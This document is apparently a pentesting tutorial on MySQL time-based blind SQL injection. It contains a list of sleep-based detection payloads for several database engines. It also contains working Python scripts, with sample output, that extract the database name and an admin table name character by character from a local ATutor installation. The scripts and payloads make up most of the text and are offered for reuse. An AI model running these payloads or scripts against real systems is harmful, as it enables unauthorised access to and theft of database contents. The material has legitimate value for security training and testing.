## MySQL Time Based Blind SQLi

> - It works the same way Boolean Based Blind SQLi works.
> - We should use it where detecting the change in content length is almost impossible.
> - It's just kind of an extension of boolean based sqli, so we can also use it where we could use boolean based payloads.

- Vulnerability Detection:
> ```sql
> SELECT CASE WHEN (1=1) THEN pg_sleep(25) ELSE pg_sleep(0) END--
> 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
> 1'=sleep(25)='1
> '%2b(select*from(select(sleep(2)))a)%2b'
> WAITFOR DELAY '0:0:25';--
> OR SLEEP(25)
> AND SLEEP(25) AND ('kleiton'='kleiton
> WAITFOR DELAY '0:0:25' and 'a'='a;--
> IF 1=1 THEN dbms_lock.sleep(25);
> SLEEP(25)
> pg_sleep(25)
> and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--
> DBMS_LOCK.SLEEP(25);
> AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:25'--
> 1,'0');waitfor delay '0:0:25;--
> (SELECT 1 FROM (SELECT SLEEP(25))A)
> %2b(select*from(select(sleep(25)))a)%2b'
> /**/xor/**/sleep(25)
> or (sleep(25)+1) limit 1 --
> ```
> - For example:
> ```sql
> http://localhost/atutor/mods/_standard/social/index_public.php?q=te%27XOR(if(now()=sysdate(),sleep(5*5),0))OR%27%23
> ```
> - It'll take almost 25 seconds for the site to load, which means it's vulnerable to sqli.

- Retrieving the database length
> - Payload:
> ```sql
> 'XOR(if(length(database())=1,sleep(5*5),0))OR'#
> ```
> - Script:
> ```python
> import multiprocessing as mp
> import requests
>
> target = "http://localhost/atutor/mods/_standard/social/index_public.php"
>
> def db_length(number):
>     payload = f"te'XOR(if(length(database())={number},sleep(3),0))OR'#"
>     param = {'q': payload}
>     r = requests.get(target, param)
>     if r.elapsed.total_seconds() > 2:
>         print(number)
>
> if __name__ == "__main__":
>     print('[*] Retreiving Database Length: \n[*] Database length: ', end=' ')
>     processes = []
>     for number in range(30):
>         p = mp.Process(target=db_length, args=[number])
>         p.start()
>         processes.append(p)
>     for process in processes:
>         process.join()
>     
>     
> ```
> ```python
> Output:
> python .\time-based\time-based-atutor-dblength.py
> [*] Retreiving Database Length:
> [*] Database length: 6
> ```

- Retrieving Database Name:
> - Payload
> ```sql
> 'XOR(if((select/**/ascii(substring(database(),1,1)))=1,sleep(5*5),0))OR'#
> ```
> - Script:
> ```python
> import requests
> import concurrent.futures
>
> target = "http://localhost/atutor/mods/_standard/social/index_public.php"
> final_string = {}
>
> def db_length(number):
>     payload = f"te'XOR(if(length(database())={number},sleep(3),0))OR'#"
>     param = {'q': payload}
>     r = requests.get(target, param)
>     if r.elapsed.total_seconds() > 2:
>         return number
>
>
> def atutor_dbRetrieval(l):
>     for j in range(32, 256):
>         payload = f"te'XOR(if((select/**/ascii(substring(database(),{l},1)))={j},sleep(3),0))OR'#"
>         param = {'q': payload}
>         r = requests.get(target, param)
>         if r.elapsed.total_seconds() > 2:
>             final_string[l-1] = chr(j)
>             print(''.join(final_string[i] for i in sorted(final_string.keys())))
>
>
>
> if __name__ == "__main__":
>     print('[*] Retreiving Database Length: \n[*] Database length: ', end=' ')
>
>     db_len = 0
>     with concurrent.futures.ProcessPoolExecutor() as executor:
>         results = [executor.submit(db_length, _) for _ in range(30)]
>
>         for f in concurrent.futures.as_completed(results):
>             if f.result() != None:
>                 db_len = f.result()
>     print(db_len)
>
>     print("[+] Retrieving Database name: ....")
>     with concurrent.futures.ThreadPoolExecutor() as executor:
>         results = [executor.submit(atutor_dbRetrieval, index) for index in range(db_len+1)]
>
>     print("[+] Database Name: ", end=" ")
>     print(''.join(final_string[i] for i in sorted(final_string.keys())))
>     print("[+] Done")
> ```
> ```python
> Output:
> python .\time-based\time-based-atutor-dbname.py  
> [*] Retreiving Database Length:
> [*] Database length:  6
> [+] Retrieving Database name: ....
> a
> ao
> aor
> ator
> atuor
> atutor
> [+] Database Name:  atutor
> [+] Done
> ```

- Retrieving table length:
> - Payload:
> ```sql
> 'XOR(if((length((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)))=12,sleep(5*5),0))OR'#
> ```
> - Script
> ```python
> import multiprocessing as mp
> import requests
>
> target = "http://localhost/atutor/mods/_standard/social/index_public.php"
>
> def table_length(number):
>     payload = f"te'XOR(if((length((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)))={number},sleep(3),0))OR'#"
>     param = {'q': payload}
>     r = requests.get(target, param)
>     if r.elapsed.total_seconds() > 2:
>         print(number)
>
> if __name__ == "__main__":
>     print('[*] Retreiving Table Length! \n[*] Table length: ', end=' ')
>     processes = []
>     for number in range(50):
>         p = mp.Process(target=table_length, args=[number])
>         p.start()
>         processes.append(p)
>     for process in processes:
>         process.join()
>     
>      
> ```
> ```python
> Output:
> python .\time-based-atutor-tableLength.py
> [*] Retreiving Table Length!
> [*] Table length: 12
> ```

- Retrieving table name:
> - Payload:
> ```sql
> 'XOR(if((select/**/ascii(substring((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),{l},1)))={j},sleep(5),0))OR'#
> ```
> - Script:
> ```python
> import requests
> import concurrent.futures
>
> target = "http://localhost/atutor/mods/_standard/social/index_public.php"
> final_string = {}
>
> def table_length(number):
>     payload = f"te'XOR(if((length((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)))={number},sleep(3),0))OR'#"
>     param = {'q': payload}
>     r = requests.get(target, param)
>     if r.elapsed.total_seconds() > 2:
>         return number
>
>     
> def atutor_tableRetrieval(l):
>     for j in range(32, 256):
>         payload = f"te'XOR(if((select/**/ascii(substring((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),{l},1)))={j},sleep(5),0))OR'#"
>         param = {'q': payload}
>         r = requests.get(target, param)
>         if r.elapsed.total_seconds() > 4:
>             final_string[l-1] = chr(j)
>             print(''.join(final_string[i] for i in sorted(final_string.keys())))
>             
>
>
> if __name__ == "__main__":
>     print('[*] Retreiving Database Length! \n[*] Table length: ', end=' ')
>     
>     table_len = 0
>     with concurrent.futures.ProcessPoolExecutor() as executor:
>         results = [executor.submit(table_length, _) for _ in range(50)]
>         
>         for f in concurrent.futures.as_completed(results):
>             if f.result() != None:
>                 table_len = f.result()
>     print(table_len)
>         
>     print("[+] Retrieving Table name!")
>     with concurrent.futures.ThreadPoolExecutor() as executor:
>         results = [executor.submit(atutor_tableRetrieval, index) for index in range(table_len+1)]
>
>     print("[+] Table Name: ", end=" ")
>     print(''.join(final_string[i] for i in sorted(final_string.keys())))
>     print("[+] Done")
> ```
> ```python
> Output:
> python .\time-based-atutor-tablename.py
> [*] Retreiving Database Length!
> [*] Table length:  12
> [+] Retrieving Table name!
> _
> __
> _a_
> a_a_
> a_ad_
> a_adi_
> a_adi_o
> a_adi_lo
> a_admi_lo
> a_admin_lo
> at_admin_lo
> at_admin_log
> [+] Table Name:  at_admin_log
> [+] Done
> ```

---

> Write your own commands / scripts as per your needs.
